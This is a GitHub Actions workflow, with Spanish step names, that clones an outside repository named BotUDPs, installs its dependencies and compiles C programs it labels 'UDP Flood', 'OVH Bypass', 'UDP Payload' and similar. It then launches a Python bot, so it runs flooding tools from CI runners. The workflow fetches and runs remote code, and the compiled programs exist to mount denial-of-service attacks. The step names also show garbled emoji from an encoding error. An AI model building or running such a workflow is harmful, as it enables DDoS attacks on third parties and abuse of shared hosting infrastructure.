name: pitoajhaushe

on:
  workflow_dispatch:

jobs:
  clone-compile-run:
    runs-on: ubuntu-latest

    steps:
    - name: üóëÔ∏è Limpiar directorio anterior
      run: |
        echo "Limpiando directorios anteriores..."
        rm -rf BotUDPs 2>/dev/null || true

    - name: üì• Clonar repositorio CON VERIFICACI√ìN
      run: |
        echo "Iniciando clonado del repositorio..."
        if git clone --verbose https://github.com/zJonch14/BotUDPs.git 2>&1; then
          echo "‚úÖ Repositorio clonado exitosamente en BotUDPs/"
        else
          echo "‚ùå Error en el clonado inicial. Probando clonado superficial (shallow clone)..."
          if git clone --depth=1 https://github.com/zJonch14/BotUDPs.git 2>&1; then
            echo "‚úÖ Repositorio clonado (shallow) exitosamente."
          else
            echo "‚ùå‚ùå Error cr√≠tico: No se pudo clonar el repositorio."
            echo "Verifica:"
            echo "1. Que la URL 'https://github.com/zJonch14/BotUDPs.git' sea correcta."
            echo "2. Que el repositorio exista y sea p√∫blico."
            echo "3. Tu conexi√≥n a internet."
            exit 1
          fi
        fi

    - name: üìã VERIFICAR que el clonado funcion√≥
      run: |
        echo "Verificando contenido del directorio clonado..."
        if [ -d "BotUDPs" ]; then
          cd BotUDPs
          echo "‚úÖ Directorio 'BotUDPs' encontrado."
          echo "Contenido inicial:"
          ls -la
          if [ -f "bot.py" ]; then
            echo "‚úÖ Archivo cr√≠tico 'bot.py' encontrado."
          else
            echo "‚ùå ERROR: El archivo 'bot.py' NO est√° en el repositorio clonado."
            echo "El repositorio podr√≠a estar vac√≠o o tener una estructura diferente."
            exit 1
          fi
          cd ..
        else
          echo "‚ùå ERROR CR√çTICO: El directorio 'BotUDPs' no se cre√≥. El clonado fall√≥."
          exit 1
        fi

    - name: üêç Configurar Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'

    - name: üì¶ Instalar dependencias
      run: |
        echo "Instalando dependencias..."
        cd BotUDPs
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        cd ..

    - name: üî® Compilar binarios C
      run: |
        echo "========================================"
        echo "COMPILANDO TODOS LOS BINARIOS C"
        echo "========================================"

        # Crear lista de m√©todos C a compilar
        declare -A c_programs=(
          ["udp.c"]="UDP Flood"
          ["udphex.c"]="UDPHEX"
          ["udppps.c"]="UDPPPS"
          ["ovh.c"]="OVH Bypass"
          ["udppayload.c"]="UDP Payload"
        )

        compiled=0
        failed=0

        cd BotUDPs # Entrar al directorio antes de compilar

        for source_file in "${!c_programs[@]}"; do
          echo ""
          echo "üî® ${c_programs[$source_file]} ($source_file)"
          if [ -f "$source_file" ]; then
            binary="${source_file%.c}"

            # Compilar seg√∫n el tipo de archivo
            if [ "$source_file" == "ovh.c" ]; then
              # OVH necesita libpcap
              gcc -O3 -pthread "$source_file" -o "$binary" -lpcap 2>/dev/null
            else
              # Otros m√©todos
              gcc -O3 -pthread "$source_file" -o "$binary" 2>/dev/null
            fi

            if [ -f "$binary" ]; then
              chmod +x "$binary"
              echo " ‚úÖ $binary compilado exitosamente"
              ((compiled++))
            else
              echo " ‚ùå Error compilando $binary"
              ((failed++))
            fi
          else
            echo " ‚ùå $source_file no encontrado"
            ((failed++))
          fi
        done

        echo ""
        echo "========================================"
        echo "RESULTADO COMPILACI√ìN:"
        echo " ‚úÖ $compiled compilados correctamente"
        echo " ‚ùå $failed con errores"
        echo ""

        # Imprimir la lista de ejecutables de forma segura
        echo "EJECUTABLES DISPONIBLES:"
        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" -print0 | while IFS= read -r -d $'\0' file; do
          base=$(basename "$file")
          echo "   - $base"
        done
        if [ "$compiled" -eq 0 ]; then
            echo "   Ninguno"
        fi

        echo "========================================"

        cd .. # Salir del directorio despu√©s de compilar y listar
    - name: ‚ñ∂Ô∏è Ejecutar Bot UDP
      run: |
        echo "Ejecutando Bot UDP..."
        cd BotUDPs
        python bot.py
        cd ..
